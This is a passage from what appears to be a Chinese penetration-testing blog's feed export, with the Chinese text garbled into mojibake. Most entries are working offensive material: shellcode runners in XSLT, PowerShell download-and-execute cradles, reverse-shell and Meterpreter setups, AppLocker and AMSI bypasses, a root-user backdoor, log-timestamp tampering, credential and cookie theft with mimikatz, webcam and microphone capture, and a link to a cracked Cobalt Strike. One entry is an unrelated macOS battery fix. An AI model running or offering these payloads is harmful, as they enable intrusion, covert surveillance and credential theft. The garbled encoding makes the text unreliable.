0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,0x6f,0x87,0xff,0xd5,0xbb,0xe0,0x1d,0x2a,0x0a,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,0x63,0x00 &#125;; UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE); Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length); IntPtr hThread = IntPtr.Zero; UInt32 threadId = 0; IntPtr pinfo = IntPtr.Zero; hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId); WaitForSingleObject(hThread, 0xFFFFFFFF); &#125;]]&gt; &lt;/msxsl:script&gt; &lt;xsl:template match="data"&gt; &lt;result&gt; &lt;xsl:value-of select="shellcode:Exec()" /&gt; &lt;/result&gt; &lt;/xsl:template&gt;&lt;/xsl:stylesheet&gt; shellcodeå¯ä»¥é€šè¿‡msfæ¥ç”Ÿæˆ,å…·ä½“ç”Ÿæˆæ–¹æ³•åœ¨ä»£ç é‡Œå·²ç»ç»™å‡ºï¼Œæµ‹è¯•å¦‚ä¸‹ï¼š 0x04 Exec JScriptæ—¢ç„¶xsltå¯ä»¥æ‰§è¡Œå¤šç§è„šæœ¬ï¼Œå½“ç„¶ä¹ŸåŒ…æ‹¬JScriptï¼Œä»£ç å¦‚ä¸‹ï¼š12345678910111213141516171819&lt;xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" xmlns:user="http://mycompany.com/mynamespace"&gt; &lt;msxsl:script language="JScript" implements-prefix="user"&gt;&lt;![CDATA[ function test()&#123; var r = new ActiveXObject("WScript.Shell").Run("calc.exe"); &#125; ]]&gt; &lt;/msxsl:script&gt; &lt;xsl:template match="data"&gt; &lt;result&gt; &lt;xsl:value-of select="user:test()" /&gt; &lt;/result&gt; &lt;/xsl:template&gt;&lt;/xsl:stylesheet&gt; è¿œç¨‹åŠ è½½å¦‚ä¸‹ï¼š1powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Ridter/xslt_poc/master/xslt_exec.ps1'); xslt_exec -xslt_url https://raw.githubusercontent.com/Ridter/xslt_poc/master/js_calc.xslt" ä¹‹å‰Casey Smithåˆ†äº«è¿‡ä¸€ä¸ªJS Dropperæˆ³æˆ‘ã€‚é‡Œé¢å¤šäº†ä¸€ä¸ªè°ƒç”¨certuil.exeå¯¹æ–‡ä»¶è¿›è¡Œbase64åŠ è§£å¯†ï¼Œè¿™é‡Œå½“ç„¶ä¹Ÿå¯ä»¥å®ç°ï¼Œå…·ä½“ä»£ç å°±ä¸è´´äº†ï¼Œåœ°å€åœ¨è¿™ã€‚ 0x05 Get Meterpreterè¯´äº†è¿™ä¹ˆå¤šï¼Œæœ‰äººå¯èƒ½ä¼šé—®æ€ä¹ˆæ‰èƒ½è·å¾—meterpreterï¼Œå…¶å®å¾ˆç®€å•ï¼Œå®ç°ä»£ç åœ¨è¿™ã€‚é¦–å…ˆmsfå¼€å¯ç›‘å¬ï¼š1234567use exploit/multi/script/web_deliveryset target 2set payload windows/meterpreter/reverse_tcpset lhost 192.168.100.101set lport 8889set uripath xsltexploit ç„¶åä¿®æ”¹meter.xsltï¼Œä¹‹åç”¨psæ¥åŠ è½½å°±å¯ä»¥äº†ã€‚ 0x06 Otherå½“ç„¶ï¼Œé™¤äº†powershellå¯ä»¥è°ƒç”¨xslt,å…¶ä»–è¯­è¨€ä¹Ÿå¯ä»¥ï¼Œè¿™é‡Œåˆ†äº«ä¸€ä¸ªC#çš„ï¼Œä»£ç å¦‚ä¸‹ï¼š1234567891011121314151617181920212223242526272829303132333435363738394041424344using System;using System.Collections.Generic;using System.IO;using System.Linq;using System.Text;using System.Threading.Tasks;using System.Xml.XPath;using System.Xml.Xsl;using System.Xml;namespace ApplyXSLTToXML&#123; class Program &#123; static void Main(string[] args) &#123; string XMLFilePath = @"https://evi1cg.github.io/scripts/example.xml"; string XSLTFilePath = @"https://evi1cg.github.io/scripts/calc.xslt"; try &#123; XsltSettings xslt_settings = new XsltSettings(false, true); xslt_settings.EnableScript = true; XslCompiledTransform xslt = new XslCompiledTransform(); XmlUrlResolver resolver = new XmlUrlResolver(); // Load documents xslt.Load(XSLTFilePath, xslt_settings, resolver); XPathDocument xmlPathDoc = new XPathDocument(XMLFilePath); XmlWriterSettings settings = new XmlWriterSettings(); settings.Indent = true; settings.OmitXmlDeclaration = true; XmlWriter writer = XmlWriter.Create("output.xml", settings); xslt.Transform(xmlPathDoc,writer); writer.Close(); &#125; catch (Exception e) &#123; Console.WriteLine("Error:"); Console.WriteLine(e.Message); &#125; &#125; &#125;&#125; å…¶ä»–è¯­è¨€çš„ï¼Œå¦‚æœéœ€è¦ï¼Œè¿˜å¸Œæœ›å°ä¼™ä¼´ä»¬è‡ªå·±åŠ¨æ‰‹å†™å†™ã€‚ 0x07 å°ç»“ä»¥ä¸Šä»…ä½œä¸ºä¸€ä¸ªæŠ€æœ¯åˆ†äº«ï¼Œä»£ç å‡å·²åœ¨githubåˆ†äº«ï¼Œåœ°å€xslt_pocï¼Œå¸Œæœ›å¯¹ä½ æœ‰æ‰€å¯å‘ã€‚]]></content>
      <categories>
        <category>æ¸—é€æ¡ˆä¾‹</category>
      </categories>
      <tags>
        <tag>xslt</tag>
        <tag>shellcode</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[cobaltstrike3.6 ç ´è§£ç‰ˆ]]></title>
    <url>%2Farchives%2FCobaltStrike_3_6_Cracked.html</url>
    <content type="text"><![CDATA[æœ€è¿‘cobaltstrikeæ›´æ–°åˆ°äº†3.6ï¼Œæ‰€ä»¥ä¸‹è½½äº†ä¸€ä¸‹ï¼Œå¹¶å‘å°ä¼™ä¼´è¿›è¡Œä¸€ä¸‹åˆ†äº«ã€‚è¿è¡Œæˆªå›¾ï¼š ç ´è§£ä»¥åçš„ä½¿ç”¨å¤©æ•°ï¼š ä½¿ç”¨3.6ä½ å°†æ‹¥æœ‰æ›´å¼ºå¤§çš„å§¿åŠ¿ï¼Œæ¯”å¦‚ï¼š ç™¾åº¦äº‘ï¼š é“¾æ¥: æˆ³æˆ‘ å¯†ç : cjfx]]></content>
      <categories>
        <category>å·¥å…·æ”¶é›†</category>
      </categories>
      <tags>
        <tag>cobaltstrike</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Bypassing Applocker with msiexec]]></title>
    <url>%2Farchives%2FBypassing_Applocker_with_msiexec.html</url>
    <content type="text"><![CDATA[msfç”ŸæˆMSIï¼š1msfvenom -f msi -p windows/exec CMD=calc.exe &gt; cacl.msi å‘½ä»¤è¡Œè¿è¡Œï¼š1msiexec /quiet /i cacl.msi å°†payloadæ”¾åœ¨è¿œç¨‹æœåŠ¡å™¨ä¸Šè¿è¡Œï¼š1msiexec /q /i https://evi1cg.github.io/payloads/calc.png]]></content>
      <categories>
        <category>å¥‡æŠ€æ·«å·§</category>
      </categories>
      <tags>
        <tag>applocker</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Commands æœé›†(æŒç»­æ›´æ–°)]]></title>
    <url>%2Farchives%2FCommands.html</url>
    <content type="text"><![CDATA[LinuxLinuxåå¼¹shellåï¼Œæ–¹ä¾¿çš„äº¤äº’ï¼š1python -c 'import pty; pty.spawn("/bin/bash")' æ— pythonæ—¶ï¼š1expect -c 'spawn bash;interact' æ— wget ncç­‰ä¸‹è½½å·¥å…·æ—¶ä¸‹è½½æ–‡ä»¶1exec 5&lt;&gt;/dev/tcp/sec-lab.org/80 &amp;&amp;echo -e â€œGET /c.pl HTTP/1.0\nâ€ &gt;&amp;5 &amp;&amp; cat&lt;&amp;5 &gt; c.pl ä¿®æ”¹ä¸Šä¼ æ–‡ä»¶æ—¶é—´æˆ³(æ©ç›–å…¥ä¾µç—•è¿¹)1touch -r è€æ–‡ä»¶æ—¶é—´æˆ³ æ–°æ–‡ä»¶æ—¶é—´æˆ³ åˆ©ç”¨BASHææƒ è¿™ä¸ªè¦æ±‚ç®¡ç†å‘˜æœ‰suçš„ä¹ æƒ¯ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡å®ƒæ¥æ·»åŠ ä¸€ä¸ªid=0çš„ç”¨æˆ·$PROMPT_COMMAND åˆ©ç”¨è¿™ä¸ªå˜é‡ä¿å­˜äº†åœ¨ä¸»æç¤ºç¬¦$PS1æ˜¾ç¤ºä¹‹å‰éœ€è¦æ‰§è¡Œçš„å‘½ä»¤å¯¼å…¥:1export PROMPT_COMMAND=â€/usr/sbin/useradd -o -u 0 hack &amp;&gt;/dev/null &amp;&amp; echo hacker:123456 | /usr/sbin/chpasswd &amp;&gt;/dev/null &amp;&amp; unset PROMPT_COMMANDâ€ lsof å‘½ä»¤12345678lsof 1.txt æ˜¾ç¤ºå¼€å¯æ–‡ä»¶ abc.txt çš„è¿›ç¨‹lsof -i :22 çŸ¥é“ 22 ç«¯å£ç°åœ¨è¿è¡Œä»€ä¹ˆç¨‹åºlsof -c nsd æ˜¾ç¤º nsd è¿›ç¨‹ç°åœ¨æ‰“å¼€çš„æ–‡ä»¶lsof -g gid æ˜¾ç¤ºå½’å± gid çš„è¿›ç¨‹æƒ…å†µlsof +d /usr/local/ æ˜¾ç¤ºç›®å½•ä¸‹è¢«è¿›ç¨‹å¼€å¯çš„æ–‡ä»¶lsof +D /usr/local/ åŒä¸Šï¼Œä½†æ˜¯ä¼šæœç´¢ç›®å½•ä¸‹çš„ç›®å½•ï¼Œæ—¶é—´è¾ƒé•¿lsof -d 4 æ˜¾ç¤ºä½¿ç”¨ fd ä¸º4 çš„è¿›ç¨‹lsof -i [i] ç”¨ä»¥æ˜¾ç¤ºç¬¦åˆæ¡ä»¶çš„è¿›ç¨‹æƒ…å†µ SSHç«¯å£è½¬å‘ä¸‹é¢æ–‡ç« è¯¦ç»†æè¿°äº†3ç§æ–¹å¼è½¬å‘http://www.cnblogs.com/david-zhang-index/archive/2012/08/18/2645943.html å›¾ç‰‡é©¬1Exiftool â€œ-comment&lt;=raj.phpâ€ 1.png WindowsPowershell ç›¸å…³è·å–æ— çº¿å¯†ç ï¼š1powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/MyShell/Get-WLAN-Keys.ps1');Get-Wlan-Keys " ææƒåŠ è´¦å·1powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/MyShell/Invoke-MS16-032.ps1');Invoke-MS16-032 -Application cmd.exe -commandline '/c net user evi1cg test123 /add'" ä¸‹è½½æ‰§è¡Œï¼š1powershell -w hidden -c (new-object System.Net.WebClient).Downloadfile('http://b.hiphotos.baidu.com/image/pic/item/d009b3de9c82d15825ffd75c840a19d8bd3e42da.jpg','C:\\Users\Public\\test.jpg') &amp; start C:\\Users\\Public\\test.jpg æ‘„åƒå¤´å½•åƒï¼š1powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/xorrior/RandomPS-Scripts/master/MiniEye.ps1'); Capture-MiniEye -RecordTime 2 -Path $env:temp\hack.avi" å½•éŸ³:1powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Exfiltration/Get-MicrophoneAudio.ps1');Get-MicrophoneAudio -Path $env:TEMP\secret.wav -Length 10 -Alias 'SECRET'" MSHTAVBSCRIPT EXEC1mshta vbscript:CreateObject("Wscript.Shell").Run("calc.exe",0,true)(window.close) JAVASCRIPT EXEC1mshta javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WScript.Shell").run("calc.exe",0,true);try&#123;h.Send();b=h.ResponseText;eval(b);&#125;catch(e)&#123;new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im mshta.exe",0,true);&#125; JSRAT1mshta javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");h.Open("GET","http://192.168.2.101:9998/connect",false);try&#123;h.Send();b=h.ResponseText;eval(b);&#125;catch(e)&#123;new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im mshta.exe",0,true);&#125; Bypass AMSI:1PS C:\&gt; [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true) use:1powershell.exe -ExecutionPolicy Bypass -noprofile [Ref].Assembly.GetType(''System.Management.Automation.AmsiUtils'').GetField(''amsiInitFailed'',''NonPublic,Static'').SetValue($null,$true);iex(New-Object Net.WebClient).DownloadString(''http://192.168.230.1/msfpayload.ps1'') Bypass AV12sqlite3.exe -cmd "select load_extension('1.txt','EP')"sqlite3.exe -cmd "select load_extension('\\192.168.1.101\share\1.txt','EP')" mimikatzè·å–vpnå¯†ç 1mimikatz.exe privilege::debug token::elevate lsadump::sam lsadump::secrets exit è¯»å–chrome cookies123mimikatz.exe privilege::debug log "dpapi::chrome /in:%localappdata%\google\chrome\USERDA~1\default\cookies /unprotect" exitmimikatz.exe privilege::debug log "dpapi::chrome /in:%localappdata%\google\chrome\USERDA~1\default\USERDA~1" exitmimikatz.exe privilege::debug log "dpapi::chrome /in:%localappdata%\google\chrome\USERDA~1\default\LOGIND~1" exit ææƒå¸¸ç”¨// What system are we connected to?1systeminfo | findstr /B /C:"OS Name" /C:"OS Version" // Get the hostname and username (if available)12hostnameecho %username% // Get users12net usersnet user [username] // Networking stuff1ipconfig /all // Printer?1route print // ARP-arific1arp -A // Active network connections1netstat -ano // Firewall fun (Win XP SP2+ only)12netsh firewall show statenetsh firewall show config // Scheduled tasks1schtasks /query /fo LIST /v // Running processes to started services12tasklist /SVCnet start // Driver madness1DRIVERQUERY // WMIC fun (Win 7/8 â€“ XP requires admin)1wmic /? //Use wmic_info script! // WMIC: check patch level1wmic qfe get Caption,Description,HotFixID,InstalledOn // Search pathces for given patch1wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB.." // AlwaysInstallElevated fun12reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevatedreg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated // Other commands to run to hopefully get what we need1234dir /s *pass* == *cred* == *vnc* == *.config*findstr /si password *.xml *.ini *.txtreg query HKLM /f password /t REG_SZ /sreg query HKCU /f password /t REG_SZ /s // Service permissions12sc querysc qc [service_name] // Accesschk stuff download link1234accesschk.exe /accepteula (always do this first!!!!!)accesschk.exe -ucqv [service_name] (requires sysinternals accesschk!)accesschk.exe -uwcqv "Authenticated Users" * (won't yield anything on Win 8)accesschk.exe -ucqv [service_name] // Find all weak folder permissions per drive.12accesschk.exe -uwdqs Users c:\accesschk.exe -uwdqs "Authenticated Users" c:\ // Find all weak file permissions per drive.12accesschk.exe -uwqs Users c:\*.*accesschk.exe -uwqs "Authenticated Users" c:\*.* // Binary planting1234sc config [service_name] binpath= "C:\nc.exe -nv [RHOST] [RPORT] -e C:\WINDOWS\System32\cmd.exe"sc config [service_name] obj= ".\LocalSystem" password= ""sc qc [service_name] (to verify!)net start [service_name] CMD1%ProgramData:~0,1%%ProgramData:~9,2% /c echo å‘½ä»¤è¡Œä¸‹è½½1certutil -urlcache -split -f example.com/file]]></content>
      <categories>
        <category>æŠ€æœ¯åˆ†äº«</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[MSSQLæ³¨å…¥æ—¶é€šè¿‡Agent Jobæ‰§è¡Œå‘½ä»¤]]></title>
    <url>%2Farchives%2FMssql_Agent_Job_Exec.html</url>
    <content type="text"><![CDATA[1USE msdb; EXEC dbo.sp_add_job @job_name = N'test_powershell_job1' ; EXEC sp_add_jobstep @job_name = N'test_powershell_job1', @step_name = N'test_powershell_name1', @subsystem = N'PowerShell', @command = N'powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring(''http://IP_OR_HOSTNAME/file''))"', @retry_attempts = 1, @retry_interval = 5 ;EXEC dbo.sp_add_jobserver @job_name = N'test_powershell_job1'; EXEC dbo.sp_start_job N'test_powershell_job1';]]></content>
      <categories>
        <category>å¥‡æŠ€æ·«å·§</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[15ç‰ˆ osx10.11 El Capitanç›’ç›–è€—ç”µè§£å†³æ–¹æ¡ˆ]]></title>
    <url>%2Farchives%2Fosx10-11_weak_up_fix.html</url>
    <content type="text"><![CDATA[15ç‰ˆçš„macbook pro æ›´æ–°El Capitanä¹‹å,æ¯å¤©ç”µè„‘ç›’ç›–ä¹‹åè¿˜è€—è´¹äº†æŒºå¤šç”µï¼Œå·®ä¸å¤šä¸€æ™šå¹³å‡3%-5%ï¼Œä¸€ç›´å†æƒ³åŠæ³•è§£å†³ï¼Œä¹ŸæŸ¥çœ‹äº†å¥½å¤šæ–¹å¼ï¼Œä¸€ç›´æ²¡æœ‰ä»€ä¹ˆæ•ˆæœï¼Œç»è¿‡å¤šæ¬¡å°è¯•ï¼Œç»ˆäºè§£å†³äº†ã€‚å¦ˆå¦ˆå†ä¹Ÿä¸ç”¨æ‹…å¿ƒç”µè„‘ç»§ç»­è€—ç”µäº†ã€‚æ‰€ä»¥ç°åœ¨åˆ†äº«ä¸€ä¸‹è¿™ä¸ªæ–¹æ³•ã€‚ é¦–å…ˆå¯ä»¥æŸ¥çœ‹ä¸€ä¸‹æ˜¯ä»€ä¹ˆåœ¨å”¤é†’ç”µè„‘ï¼š1syslog | grep -i "wake reason" æˆ‘çš„ç”µè„‘æ™šä¸Šè€æ˜¯è¢« RTC (Alarm) å”¤é†’ï¼Œå·®ä¸å¤šä¸¤å°æ—¶ä¸€æ¬¡ã€‚è¯¥æ€ä¹ˆè§£å†³å‘¢ï¼Ÿ å¾ˆç®€å•ã€‚ é¦–å…ˆé‡å¯ç”µè„‘è¿›å…¥Recoveryã€‚å†é‡å¯å¬åˆ°å¼€æœºçš„é‚£ä¸ªå£°éŸ³çš„æ—¶å€™ï¼ŒæŒ‰ä½comman+R ç›´åˆ°è‹¹æœçš„å›¾æ ‡å‡ºç°ã€‚ ä¹‹åæ‰¾åˆ°ç»ˆç«¯ï¼Œç„¶åè¾“å…¥ä»¥ä¸‹å‘½ä»¤ï¼š1csrutil disable æ¥ç¦æ­¢SIPï¼Œä¹‹åæˆ‘ä»¬å°±å¯ä»¥ä¿®æ”¹ä¸€äº›ç³»ç»Ÿçš„æ–‡ä»¶äº†ã€‚ ä¹‹åé‡å¯ç”µè„‘ï¼Œæ‰“å¼€ç»ˆç«¯ï¼š1sudo vim /System/Library/LaunchDaemons/com.apple.mDNSResponder.plist æ‰¾åˆ°&lt;string&gt;/usr/sbin/mDNSResponder&lt;/string&gt; ä¹‹åæ’å…¥1&lt;string&gt;-NoMulticastAdvertisements&lt;/string&gt; æœ€ç»ˆçš„æ ·å­æ˜¯è¿™æ ·çš„:1234&lt;array&gt; &lt;string&gt;/usr/sbin/mDNSResponder&lt;/string&gt; &lt;string&gt;-NoMulticastAdvertisements&lt;/string&gt;&lt;/array&gt; å†æ¬¡é‡å¯è¿›å…¥Recoveryå¹¶æ‰“å¼€ç»ˆç«¯å¼€å¯SIP1csrutil enable ä¹‹åå†é‡å¯å°±å¯ä»¥äº†ã€‚ å†çœ‹çœ‹ä½ çš„ç”µè„‘çš„è€—ç”µå§ã€‚å¸Œæœ›èƒ½å¸®åˆ°ä½ ï¼]]></content>
      <categories>
        <category>éšä¾¿å†™å†™</category>
      </categories>
      <tags>
        <tag>osx</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Bypassing Applocker with MSBuild.exe]]></title>
    <url>%2Farchives%2Fypassing_Applocker_with_MSBuild-exe.html</url>
    <content type="text"><![CDATA[å‰ä¸€ç¯‡æ–‡ç« æ€»ç»“äº†å‡ ç§bypass Applockerçš„æ–¹æ³•ï¼Œæœ€è¿‘åˆåœ¨ @subTee åšå®¢å­¦åˆ°äº†æ–°çš„æ–¹æ³•ï¼Œæ‰€ä»¥åœ¨è¿™é‡Œè¿›è¡Œä¸€ä¸‹ç®€å•çš„åˆ†äº«ã€‚ é¦–å…ˆä»‹ç»ä¸€ä¸‹MSBuildï¼ŒMSBuild æ˜¯ Microsoft å’Œ Visual Studioçš„ç”Ÿæˆç³»ç»Ÿã€‚é»˜è®¤æ˜¯å­˜åœ¨äºwindowsç³»ç»Ÿä¸Šçš„ã€‚é‚£ä¹ˆæ€ä¹ˆä½¿ç”¨msbuildæ‰§è¡Œæˆ‘ä»¬çš„ä»£ç å‘¢ï¼Ÿ å…³äºç»†èŠ‚å¯ä»¥çœ‹è¿™é‡Œï¼š https://msdn.microsoft.com/en-us/library/dd722601.aspx @subTee ç»™å‡ºäº†å‡ ä¸ªPOCã€‚ Demoæµ‹è¯•Hello World:12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt;Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003"&gt; &lt;!-- This inline task executes c# code. --&gt; &lt;!-- C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe SimpleTasks.csproj --&gt; &lt;!-- Save This File And Execute The Above Command --&gt; &lt;!-- Author: Casey Smith, Twitter: @subTee --&gt; &lt;!-- License: BSD 3-Clause --&gt; &lt;Target Name="Hello"&gt; &lt;FragmentExample /&gt; &lt;ClassExample /&gt; &lt;/Target&gt; &lt;UsingTask TaskName="FragmentExample" TaskFactory="CodeTaskFactory" AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" &gt; &lt;ParameterGroup/&gt; &lt;Task&gt; &lt;Using Namespace="System" /&gt; &lt;Code Type="Fragment" Language="cs"&gt; &lt;![CDATA[ Console.WriteLine("Hello From a Code Fragment"); ]]&gt; &lt;/Code&gt; &lt;/Task&gt; &lt;/UsingTask&gt; &lt;UsingTask TaskName="ClassExample" TaskFactory="CodeTaskFactory" AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" &gt; &lt;Task&gt; &lt;!-- &lt;Reference Include="System.IO" /&gt; Example Include --&gt; &lt;Code Type="Class" Language="cs"&gt; &lt;![CDATA[ using System; using Microsoft.Build.Framework; using Microsoft.Build.Utilities; public class ClassExample : Task, ITask &#123; public override bool Execute() &#123; Console.WriteLine("Hello From a Class."); return true; &#125; &#125; ]]&gt; &lt;/Code&gt; &lt;/Task&gt; &lt;/UsingTask&gt;&lt;/Project&gt; ä»¥ä¸Šæ–‡ä»¶ä¿å­˜ä¸º123.csprojï¼Œç„¶åä½¿ç”¨msbuildæ‰§è¡Œã€‚ Execute PowerShell Commandsæˆ‘ä»¬çŸ¥é“é€šè¿‡c#æ˜¯å¯ä»¥æ‰§è¡Œpowershellçš„ï¼Œé‚£ä¹ˆåŒæ ·çš„ï¼Œä½¿ç”¨msbuildä¹Ÿå¯ä»¥ã€‚ pshell.xml123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109&lt;Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003"&gt; &lt;!-- This inline task executes c# code. --&gt; &lt;!-- C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe pshell.xml --&gt; &lt;!-- Author: Casey Smith, Twitter: @subTee --&gt; &lt;!-- License: BSD 3-Clause --&gt; &lt;Target Name="Hello"&gt; &lt;FragmentExample /&gt; &lt;ClassExample /&gt; &lt;/Target&gt; &lt;UsingTask TaskName="FragmentExample" TaskFactory="CodeTaskFactory" AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" &gt; &lt;ParameterGroup/&gt; &lt;Task&gt; &lt;Using Namespace="System" /&gt; &lt;Using Namespace="System.IO" /&gt; &lt;Code Type="Fragment" Language="cs"&gt; &lt;![CDATA[ Console.WriteLine("Hello From Fragment"); ]]&gt; &lt;/Code&gt; &lt;/Task&gt; &lt;/UsingTask&gt; &lt;UsingTask TaskName="ClassExample" TaskFactory="CodeTaskFactory" AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" &gt; &lt;Task&gt; &lt;Reference Include="System.Management.Automation" /&gt; &lt;Code Type="Class" Language="cs"&gt; &lt;![CDATA[ using System; using System.IO; using System.Diagnostics; using System.Reflection; using System.Runtime.InteropServices; //Add For PowerShell Invocation using System.Collections.ObjectModel; using System.Management.Automation; using System.Management.Automation.Runspaces; using System.Text; using Microsoft.Build.Framework; using Microsoft.Build.Utilities; public class ClassExample : Task, ITask &#123; public override bool Execute() &#123; while(true) &#123; Console.Write("PS &gt;"); string x = Console.ReadLine(); try &#123; Console.WriteLine(RunPSCommand(x)); &#125; catch (Exception e) &#123; Console.WriteLine(e.Message); &#125; &#125; return true; &#125; //Based on Jared Atkinson's And Justin Warner's Work public static string RunPSCommand(string cmd) &#123; //Init stuff Runspace runspace = RunspaceFactory.CreateRunspace(); runspace.Open(); RunspaceInvoke scriptInvoker = new RunspaceInvoke(runspace); Pipeline pipeline = runspace.CreatePipeline(); //Add commands pipeline.Commands.AddScript(cmd); //Prep PS for string output and invoke pipeline.Commands.Add("Out-String"); Collection&lt;PSObject&gt; results = pipeline.Invoke(); runspace.Close(); //Convert records to strings StringBuilder stringBuilder = new StringBuilder(); foreach (PSObject obj in results) &#123; stringBuilder.Append(obj); &#125; return stringBuilder.ToString().Trim(); &#125; public static void RunPSFile(string script) &#123; PowerShell ps = PowerShell.Create(); ps.AddScript(script).Invoke(); &#125; &#125; ]]&gt; &lt;/Code&gt; &lt;/Task&gt; &lt;/UsingTask&gt;&lt;/Project&gt; å¯ä»¥æ‰©å±•çš„åœ°æ–¹è¿˜æœ‰å¾ˆå¤šï¼Œæƒ³ç©å„¿çš„å¯ä»¥åœ¨ç¢ç£¨ç¢ç£¨ã€‚]]></content>
      <categories>
        <category>å¥‡æŠ€æ·«å·§</category>
      </categories>
      <tags>
        <tag>bypass</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[AppLocker Bypass Techniques]]></title>
    <url>%2Farchives%2FAppLocker_Bypass_Techniques.html</url>
    <content type="text"><![CDATA[from:https://www.youtube.com/watch?v=z04NXAkhI4k 0x00 Command å’Œ Powershell æ²¡è¢«ç¦ç”¨ï¼Œè„šæœ¬è¢«ç¦ç”¨ 1ã€ç›´æ¥ä½¿ç”¨cmd powershellæ‰§è¡ŒPowershell:1IEX (New-Object Net.WebClient).DownloadString('http://ip:port/') Commandï¼š1powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://ip:port/') 2ã€ç®¡é“Powershell:1Get-Content script.ps1 | iex Commandï¼š1cmd.exe /K &lt; payload.bat 3ã€htapayload.hta12345678910&lt;HTML&gt; &lt;HEAD&gt; &lt;script language="VBScript"&gt; Set objShell = CreateObject("Wscript.Shell") objShell.Run "powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://ip:port/')"&lt;/script&gt;&lt;/HEAD&gt; &lt;BODY&gt; &lt;/BODY&gt; &lt;/HTML&gt; 4ã€Regsvr32.exe 1regsvr32 /u /n /s /i:payload.sct scrobj.dll 1regsvr32 /u /n /s /i:http://ip:port/payload.sct scrobj.dll payload.sct:123456789101112131415&lt;?XML version="1.0"?&gt;&lt;scriptlet&gt;&lt;registration progid="ShortJSRAT" classid="&#123;10001111-0000-0000-0000-0000FEEDACDC&#125;" &gt; &lt;!-- Learn from Casey Smith @subTee --&gt; &lt;script language="JScript"&gt; &lt;![CDATA[ rat="powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://ip:port/')"; new ActiveXObject("WScript.Shell").Run(rat,0,true); ]]&gt;&lt;/script&gt;&lt;/registration&gt;&lt;/scriptlet&gt; 5ã€rundll32payload:1rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://ip:port/');") 6ã€dll/cplpayload.dll1msfvenom -p windows/meterpreter/reverse_tcp -b '\x00\xff' lhost=192.168.127.132 lport=8888 -f dll -o payload.dll è¿è¡Œï¼š1rundll32 shell32.dll,Control_RunDLL payload.dll å°†dllé‡å‘½åä¸ºcplï¼ŒåŒå‡»è¿è¡Œã€‚ 7ã€nishang æ–‡ä»¶backdoor nishang client http://drops.wooyun.org/tips/8568 0x01 å¯æ‰§è¡Œç›®å½• é€šè¿‡psè„šæœ¬æ‰«æå¯å†™å…¥çš„è·¯å¾„ ä¸‹è½½åœ°å€ï¼šhttp://go.mssec.se/AppLockerBC æ‰«æå¯æ‰§è¡Œè·¯å¾„ï¼š ç»•è¿‡AppLockeræ‰§è¡Œï¼š 0x02 ç¦ç”¨powershellä»¥å é…ç½®ç¦ç”¨powershell ç¦ç”¨ä»¥åå†æ¬¡æ‰“å¼€powershell 